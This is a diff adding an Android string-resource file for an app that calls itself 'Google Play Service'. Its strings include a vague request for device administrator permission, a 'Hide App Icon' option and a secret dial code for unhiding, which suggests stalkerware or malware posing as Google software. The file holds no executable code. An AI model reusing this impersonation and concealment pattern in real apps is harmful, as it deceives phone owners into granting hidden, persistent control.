@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Google Play Service</string>
+    <string name="device_admin_explanation">Please enable administrator permission to work the app correctly</string>
+    <string name="hide_app_icon">Hide App Icon</string>
+    <string name="oops_failed_to_open_google_play_please_open_it_manually">"Oops! Failed to open Google Play. 
+Please open it manually"</string>
+    <string name="open_google_play">Open Google Play</string>
+    <string name="status_bar_notification_info_overflow">999+</string>
+    <string name="unhide_phone_number">*55555#</string>
+</resources>
